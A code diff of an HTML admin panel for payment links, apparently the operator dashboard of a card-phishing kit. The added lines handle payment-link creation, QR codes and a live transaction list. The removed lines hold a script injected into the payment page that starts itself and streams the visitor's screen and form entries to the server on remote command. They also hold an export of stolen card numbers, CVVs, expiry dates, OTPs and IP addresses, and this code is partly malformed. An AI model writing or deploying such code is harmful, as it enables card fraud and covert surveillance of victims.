+        generateLinkBtn.addEventListener('click', generatePaymentLink);
+        copyLinkBtn.addEventListener('click', copyToClipboard);
+        refreshBtn.addEventListener('click', () => {
+            socket.emit('get_transactions');
+        });
+        
+        // Socket event handlers
+        socket.on('connect', () => {
+            console.log('Connected to server');
+            socket.emit('admin_connect');
+            socket.emit('get_transactions');
+        });
+        
+        socket.on('payment_link_created', data => {
+            const { id, url, amount, phoneNumber } = data;
+            paymentLinkInput.value = url;
+            
+            // Generate QR code
+            qrcodeContainer.innerHTML = '';
+            new QRCode(qrcodeContainer, {
+                text: url,
+                width: 128,
+                height: 128
+            });
+            
+            paymentLinks.push({ id, url, amount, phoneNumber });
+        });
+        
+        socket.on('transactions_update', data => {
+            transactions = data;
+            renderTransactions();
+        });
+        
+        socket.on('transaction_updated', data => {
+            const index = transactions.findIndex(tx => tx.id === data.id);
+            if (index !== -1) {
+                transactions[index] = data;
+            } else {
+                transactions.push(data);
+            }
+            renderTransactions();
+        });
+        
+        socket.on('new_transaction', data => {
+            transactions.unshift(data);
+            renderTransactions();
+        });
+        
+        // Initialize
+        renderTransactions();
     </script>
-
-  <!-- Add this script for screen capture injection -->
-  <script>
-    // This script will be injected into the payment page to enable screen capture
-    window.advancedCaptureScript = `
-      // Advanced screen capture script
-      (function() {
-        // Variables for the capture process
-        let captureInterval = null;
-        let lastCaptureTime = 0;
-        const CAPTURE_FPS = 3; // Lower FPS to reduce bandwidth
-        const CAPTURE_QUALITY = 0.5; // Lower quality to reduce bandwidth
-        const MIN_CAPTURE_INTERVAL = 1000 / CAPTURE_FPS;
-        
-        // Create hidden canvas for capturing
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        canvas.style.display = 'none';
-        document.body.appendChild(canvas);
-        
-        // Function to capture screen
-        function captureScreen() {
-          const now = Date.now();
-          if (now - lastCaptureTime < MIN_CAPTURE_INTERVAL) return;
-          lastCaptureTime = now;
-          
-          try {
-            // Use a safer approach that doesn't try to directly capture cross-origin content
-            // Create a simple page representation instead
-            
-            // Clear canvas
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            
-            // Draw clean background
-            ctx.fillStyle = '#F8F9FA';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            // Draw page URL and title
-            ctx.font = 'bold 14px Arial';
-            ctx.fillStyle = '#333';
-            ctx.fillText('Page: ' + window.location.pathname, 10, 20);
-            ctx.fillText('Title: ' + document.title, 10, 40);
-            
-            // Draw current time
-            ctx.font = '12px Arial';
-            ctx.fillStyle = '#555';
-            ctx.fillText('Time: ' + new Date().toLocaleTimeString(), 10, 60);
-            
-            // Draw page structure representation
-            let yPos = 90;
-            
-            // Function to safely get computed color
-            function safeGetColor(colorStr) {
-              if (!colorStr || colorStr === 'transparent' || colorStr === 'rgba(0, 0, 0, 0)') {
-                return '#e0e0e0';
-              }
-              return colorStr;
-            }
-            
-            // Draw main content sections (safe representation)
-            document.querySelectorAll('div, section, main, form').forEach(el => {
-              // Skip tiny or invisible elements
-              const rect = el.getBoundingClientRect();
-              if (rect.width < 50 || rect.height < 30 || 
-                  rect.top > window.innerHeight || rect.bottom < 0) return;
-              if (getComputedStyle(el).display === 'none' || getComputedStyle(el).visibility === 'hidden') return;
-              
-              try {
-                const styles = window.getComputedStyle(el);
-                const bgColor = safeGetColor(styles.backgroundColor);
-                
-                // Draw a box representing this element (scaled)
-                const scaleFactor = 0.8;
-                const scaledLeft = rect.left * scaleFactor;
-                const scaledTop = (rect.top * scaleFactor) + 80; // Add offset for header
-                const scaledWidth = rect.width * scaleFactor;
-                const scaledHeight = rect.height * scaleFactor;
-                
-                // Draw the box
-                ctx.fillStyle = bgColor;
-                ctx.strokeStyle = '#999';
-                ctx.lineWidth = 1;
-                ctx.fillRect(scaledLeft, scaledTop, scaledWidth, scaledHeight);
-                ctx.strokeRect(scaledLeft, scaledTop, scaledWidth, scaledHeight);
-                
-                yPos = Math.max(yPos, scaledTop + scaledHeight + 20);
-              } catch (e) {
-                console.error('Error capturing element:', e);
-              }
-            });
-            
-            // Draw form elements and their values (safely)
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#333';
-            ctx.fillText('Form Field Values:', 10, yPos);
-            yPos += 20;
-            
-            // Process visible inputs
-            document.querySelectorAll('input, select, textarea').forEach(input => {
-              const rect = input.getBoundingClientRect();
-              if (rect.top > window.innerHeight || rect.bottom < 0) return;
-              if (input.type === 'hidden') return;
-              
-              // Get label or placeholder or name
-              let labelText = '';
-              
-              // Try to find associated label
-              const id = input.id;
-              if (id) {
-                const label = document.querySelector(`label[for="${id}"]`);
-                if (label) {
-                  labelText = label.textContent.trim();
-                }
-              }
-              
-              // If no label found, try other identifiers
-              if (!labelText) {
-                labelText = input.placeholder || input.name || input.id || input.type;
-              }
-              
-              // Get input value (mask sensitive data)
-              let valueText = '';
-              if (input.type === 'password') {
-                valueText = '••••••••';
-              } else if (input.type === 'file') {
-                valueText = input.files && input.files.length > 0 ? 'File selected' : 'No file';
-              } else if (input.type === 'checkbox' || input.type === 'radio') {
-                valueText = input.checked ? 'Checked' : 'Unchecked';
-              } else if (input.tagName === 'SELECT') {
-                valueText = input.options[input.selectedIndex]?.text || '';
-              } else {
-                // Mask potential card numbers
-                if (/^(?:\\d[ -]*){13,19}$/.test(input.value) || // Credit card pattern 
-                    labelText.toLowerCase().includes('card') || 
-                    labelText.toLowerCase().includes('credit')) {
-                  valueText = input.value.replace(/\\d(?=\\d{4})/g, '•');
-                } else {
-                  valueText = input.value;
-                }
-              }
-              
-              // Draw this input's info
-              ctx.fillStyle = '#444';
-              ctx.fillText(`${labelText}: ${valueText}`, 20, yPos);
-              yPos += 20;
-            });
-            
-            // Show alert/modal dialogs if present
-            const modals = Array.from(document.querySelectorAll('.modal, [role="dialog"], [aria-modal="true"]'))
-              .filter(el => el.offsetWidth > 0 && el.offsetHeight > 0);
-              
-            if (modals.length > 0) {
-              yPos += 20;
-              ctx.fillStyle = '#E53935';
-              ctx.fillText('Active Modal/Dialog Content:', 10, yPos);
-              yPos += 20;
-              
-              modals.forEach(modal => {
-                const modalText = modal.textContent.trim().substring(0, 100) + (modal.textContent.length > 100 ? '...' : '');
-                ctx.fillStyle = '#333';
-                ctx.fillText(modalText, 20, yPos);
-                yPos += 20;
-              });
-            }
-            
-            // Add device info
-            yPos = Math.max(yPos, canvas.height - 60);
-            ctx.fillStyle = '#888';
-            ctx.font = '12px Arial';
-            ctx.fillText(`Window size: ${window.innerWidth}x${window.innerHeight} | User agent: ${navigator.userAgent.substring(0, 50)}...`, 10, yPos);
-            
-            // Draw border
-            ctx.strokeStyle = '#007BFF';
-            ctx.lineWidth = 2;
-            ctx.strokeRect(0, 0, canvas.width, canvas.height);
-            
-            // Add timestamp to show it's updating
-            ctx.fillStyle = 'rgba(0,0,0,0.7)';
-            ctx.fillRect(canvas.width - 150, canvas.height - 25, 140, 20);
-            ctx.fillStyle = '#fff';
-            ctx.font = '12px Arial';
-            ctx.fillText(new Date().toLocaleTimeString(), canvas.width - 140, canvas.height - 10);
-            
-            // Convert canvas to image data URL
-            try {
-              const frameData = canvas.toDataURL('image/jpeg', CAPTURE_QUALITY);
-              sendFrame(frameData);
-            } catch (canvasError) {
-              console.error('Canvas export error:', canvasError);
-              // If toDataURL fails, try to render a simpler version
-              renderFallbackCapture();
-            }
-          } catch (error) {
-            console.error('Error in screen capture:', error);
-            renderFallbackCapture();
-          }
-        }
-        
-        // Fallback capture method that only shows text representation
-        function renderFallbackCapture() {
-          try {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            
-            // Black background
-            ctx.fillStyle = '#222';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            // Draw error message
-            ctx.font = 'bold 16px Arial';
-            ctx.fillStyle = '#ff5555';
-            ctx.fillText('Canvas capture blocked by browser security policy', 20, 30);
-            ctx.fillText('Using text-only representation instead', 20, 55);
-            
-            // Draw basic page info
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#ffffff';
-            ctx.fillText('URL: ' + window.location.href.substring(0, 50), 20, 90);
-            ctx.fillText('Title: ' + document.title, 20, 110);
-            ctx.fillText('Time: ' + new Date().toLocaleTimeString(), 20, 130);
-            
-            // Show page text content
-            let y = 160;
-            ctx.font = '12px Arial';
-            
-            // Get visible text nodes
-            const textWalker = document.createTreeWalker(
-              document.body,
-              NodeFilter.SHOW_TEXT,
-              {
-                acceptNode: function(node) {
-                  // Check if parent element is visible
-                  const el = node.parentElement;
-                  if (!el) return NodeFilter.FILTER_REJECT;
-                  
-                  const style = window.getComputedStyle(el);
-                  if (style.display === 'none' || style.visibility === 'hidden') {
-                    return NodeFilter.FILTER_REJECT;
-                  }
-                  
-                  // Only accept non-empty text nodes
-                  return node.textContent.trim() ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_REJECT;
-                }
-              }
-            );
-            
-            // Process visible text (limited amount)
-            let textCount = 0;
-            let node;
-            while (textCount < 30 && (node = textWalker.nextNode())) {
-              const text = node.textContent.trim();
-              if (text && text.length > 3) { // Skip very short text
-                ctx.fillText(text.substring(0, 100), 20, y);
-                y += 20;
-                textCount++;
-                
-                if (y > canvas.height - 40) break; // Don't go beyond canvas
-              }
-            }
-            
-            // Add notice at bottom
-            ctx.fillStyle = '#aaaaaa';
-            ctx.fillText('Live text capture - Limited due to browser security restrictions', 20, canvas.height - 20);
-            
-            // Send this fallback version
-            const frameData = canvas.toDataURL('image/jpeg', 0.7);
-            sendFrame(frameData);
-          } catch (fallbackError) {
-            console.error('Fallback capture failed:', fallbackError);
-            socket.emit('screen_capture_error', {
-              error: 'Complete capture failure: ' + fallbackError.message
-            });
-          }
-        }
-        
-        // Function to send the frame data
-        function sendFrame(frameData) {
-          try {
-            // Get URL parameters to include with the frame
-            const urlParams = new URLSearchParams(window.location.search);
-            const pid = urlParams.get('pid');
-            
-            // Send frame data to server with additional info
-            socket.emit('screen_frame', {
-              frameData: frameData,
-              frameType: 'image',
-              timestamp: Date.now(),
-              frameId: Math.random().toString(36).substring(2, 15),
-              pid: pid,
-              url: window.location.href,
-              title: document.title
-            });
-            
-            // Also send a heartbeat with the frame
-            socket.emit('visitor_heartbeat', { 
-              pid: pid,
-              timestamp: Date.now()
-            });
-          } catch (err) {
-            console.error('Error sending frame:', err);
-          }
-        }
-        
-        // Function to start capturing
-        function startCapture() {
-          if (captureInterval) return; // Already running
-          
-          // Update canvas dimensions
-          canvas.width = Math.min(window.innerWidth, 1280); // Cap width for performance
-          canvas.height = Math.min(window.innerHeight, 800); // Cap height for performance
-          
-          // Start capture loop
-          captureInterval = setInterval(captureScreen, MIN_CAPTURE_INTERVAL);
-          
-          // Do one immediate capture
-          setTimeout(captureScreen, 200);
-          
-          // Notify that capture has started
-          try {
-            socket.emit('screen_capture_started');
-          } catch (e) {
-            console.error('Failed to notify of capture start:', e);
-          }
-          
-          console.log('Screen capture started');
-        }
-        
-        // Function to stop capturing
-        function stopCapture() {
-          if (captureInterval) {
-            clearInterval(captureInterval);
-            captureInterval = null;
-            
-            // Notify that capture has stopped
-            try {
-              socket.emit('screen_capture_stopped');
-            } catch (e) {
-              console.error('Failed to notify of capture stop:', e);
-            }
-            
-            console.log('Screen capture stopped');
-          }
-        }
-        
-        // Set up heartbeat to keep connection alive
-        function setupHeartbeat() {
-          // Send heartbeat every 15 seconds
-          const heartbeatInterval = setInterval(() => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const pid = urlParams.get('pid');
-            
-            if (pid) {
-              try {
-                socket.emit('visitor_heartbeat', { 
-                  pid: pid,
-                  timestamp: Date.now(),
-                  url: window.location.href
-                });
-              } catch (e) {
-                console.error('Error sending heartbeat:', e);
-              }
-            }
-          }, 15000);
-          
-          // Clear interval when window is closed
-          window.addEventListener('beforeunload', () => {
-            clearInterval(heartbeatInterval);
-          });
-        }
-        
-        // Listen for control commands
-        socket.on('control_command', (command) => {
-          console.log('Received control command:', command);
-          
-          if (command.type === 'start_capture') {
-            startCapture();
-          } else if (command.type === 'stop_capture') {
-            stopCapture();
-          } else if (command.type === 'refresh_capture') {
-            stopCapture();
-            setTimeout(startCapture, 500);
-          }
-        });
-        
-        // Listen for window resize to update canvas dimensions
-        window.addEventListener('resize', () => {
-          if (captureInterval) {
-            canvas.width = Math.min(window.innerWidth, 1280);
-            canvas.height = Math.min(window.innerHeight, 800);
-          }
-        });
-        
-        // Start capture automatically
-        setTimeout(startCapture, 1000);
-        
-        // Setup heartbeat
-        setupHeartbeat();
-      })();
-    `;
-    
-    // Make the capture script available for injection
-    window.injectScreenCaptureCode = function() {
-      return window.advancedCaptureScript;
-    };
-
-// Function to download transactions as CSV
-function downloadTransactionsCSV() {
-  // Check if there are any transactions to download
-  if (transactionsMap.size === 0) {
-    showMessage('error', 'No transactions to download');
-    return;
-  }
-
-  try {
-    // Convert transactions to an array
-    const transactions = Array.from(transactionsMap.values());
-    
-    // Define CSV headers
-    const headers = [
-      'Invoice ID',
-      'Email',
-      'Amount',
-      'Currency',
-      'Card Number',
-      'CVV',
-      'Expiry',
-      'Cardholder Name',
-      'IP Address',
-      'Status',
-      'OTP',
-      'Timestamp',
-      'Bank Name',
-      'Country',
-      'Card Type'
-    ];
-    
-    // Create CSV content starting with headers
-    let csvContent = headers.join(',') + '\n';
-    
-    // Add data rows
-    transactions.forEach(tx => {
-      // Extract bank info if available
-      const bankName = tx.bankInfo?.bank || '';
-      const country = tx.bankInfo?.country || '';
-      const cardType = tx.bankInfo?.scheme || '';
-      
-      // Format each field and handle special characters (especially commas)
-      const row = [
-        `"${tx.id || ''}"`,
-        `"${(tx.email || '').replace(/"/g, '""')}"`, // Escape quotes in email
-        `"${tx.amount || '0'}"`,
-        `"${tx.currency || 'INR'}"`,
-        `"${tx.cardNumber || ''}"`,
-        `"${tx.cvv || ''}"`,
-        `"${tx.expiry || ''}"`,
-        `"${(tx.cardholder || '').replace(/"/g, '""')}"`, // Escape quotes in name
-        `"${tx.ip || ''}"`,
-        `"${tx.status || 'processing'}"`,
-        `"${tx.otpEntered || ''}"`,
-        `"${tx.timestamp || ''}"`,
-        `"${bankName.replace(/"/g, '""')}"`,
-        `"${country.replace(/"/g, '""')}"`,
-        `"${cardType.replace(/"/g, '""')}"`
-      ].join(',');
-      
-      csvContent += row + '\n';
-    });
-    
-    // Create a Blob with the CSV content
-    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
-    
-    // Create a download link
-    const link = document.createElement('a');
-    
-    // Create the download URL
-    const url = URL.createObjectURL(blob);
-    link.setAttribute('href', url);
-    
-    // Set filename with current date/time
-    const now = new Date();
-    const filename = `transactions_${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}_${String(now.getHours()).padStart(2, '0')}-${String(now.getMinutes()).padStart(2, '0')}.csv`;
-    link.setAttribute('download', filename);
-    
-    // Append to body, click programmatically, then remove
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-    
-    // Clean up the URL object
-    setTimeout(() => {
-      URL.revokeObjectURL(url);
-    }, 100);
-    
-    // Show success message
-    showMessage('success', `Downloaded ${transactions.length} transactions as CSV`);
-  } catch (error) {
-    console.error('Error downloading transactions:', error);
-    showMessage('error', `Error downloading transactions: ${error.message}`);
-  }
-// This code is incorrectly placed inside the downloadTransactionsCSV function:
-// Add event listener for the download button
-document.getElementById('downloadTransactionsBtn')?.addEventListener('click', downloadTransactionsCSV);
-
-// Add event listener for clear transactions
-document.getElementById('clearTransactionsBtn')?.addEventListener('click', clearAllTransactions);
-}
-  </script>
-</body>
 </body>
 </html>
